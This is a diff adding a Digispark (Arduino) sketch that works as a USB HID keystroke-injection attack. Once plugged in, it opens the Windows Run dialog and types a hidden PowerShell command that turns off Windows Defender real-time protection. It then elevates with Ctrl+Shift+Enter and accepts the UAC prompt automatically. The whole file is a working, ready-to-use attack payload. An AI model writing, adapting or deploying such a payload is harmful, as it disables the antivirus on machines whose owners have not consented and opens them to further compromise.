@@ -1,0 +1,59 @@
+/*
+ * ---------------------------------------------------------
+ * PROJECT: Digispark HID Attack - Windows Defender Disabler
+ * AUTHOR: Fred Castillo
+ * DESCRIPTION: Payload that disables Windows Defender real-time protection
+ *              via PowerShell. Bilingual comments (ES/EN).
+ * ---------------------------------------------------------
+ */
+ 
+#include "DigiKeyboard.h"
+
+void setup() {
+    // --- INICIALIZACIÓN / INITIALIZATION ---
+    
+  // Configurar LED (Pin 1 en Digispark) / Configure LED (Pin 1 on Digispark)
+  pinMode(1, OUTPUT); 
+
+  // Inicializa la librería y espera a que el sistema operativo detecte el dispositivo.
+  DigiKeyboard.sendKeyStroke(0);
+
+  // --- FASE 1: ABRIR EJECUTAR / PHASE 1: OPEN RUN ---
+  // Win + R para abrir el diálogo "Ejecutar" / Win + R to open "Run" dialog
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+
+ 
+  // --- FASE 2: EJECUTAR POWERSHELL CON VERIFICACIÓN DE ADMIN / PHASE 2: RUN POWERSHELL WITH ADMIN CHECK ---
+ DigiKeyboard.print("powershell -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\""); 
+  DigiKeyboard.delay(500);
+
+  // --- FASE 3: EJECUTAR COMO ADMINISTRADOR / PHASE 3: RUN AS ADMINISTRATOR ---
+  // Ctrl + Shift + Enter para ejecutar con privilegios elevados
+  // Ctrl + Shift + Enter to run with elevated privileges
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(2000);
+
+  // --- FASE 4: MANEJAR UAC / PHASE 4: HANDLE UAC ---
+  // Flecha izquierda + Enter para aceptar el diálogo de UAC
+  // Left arrow + Enter to accept UAC dialog (assumes Spanish/English interface)
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(500);
+
+// Presionar Enter para confirmar / Press Enter to confirm
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // 
+  DigiKeyboard.delay(1000); 
+
+  // --- FASE 5: INDICADOR DE FINALIZACIÓN / PHASE 5: COMPLETION INDICATOR ---
+  // Encender LED para indicar que el proceso ha terminado
+  // Turn on LED to indicate process completion
+  digitalWrite(1, HIGH); 
+
+  // Bucle infinito para evitar re-ejecución / Infinite loop to prevent re-execution
+  for(;;){} 
+}
+
+void loop() {
+// Vacío intencionadamente / Intentionally empty
+}
+////
